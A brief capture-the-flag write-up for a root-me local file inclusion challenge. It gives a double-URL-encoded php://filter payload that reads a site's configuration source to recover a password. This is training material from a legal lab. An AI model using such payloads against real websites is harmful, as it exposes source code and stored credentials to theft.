# Local file inclusion: double encoding

[root-me challenge: Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding): Find the validation password in the source files of the website.

----

Using [HackTricks File inclusion encoding](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding), [PayloadAllTheThings: LFI / RFI using wrappers
Wrapper -> php://filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter), and cyberchef:

```text
page=pHp%253A%252F%252FFilTer%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf
```
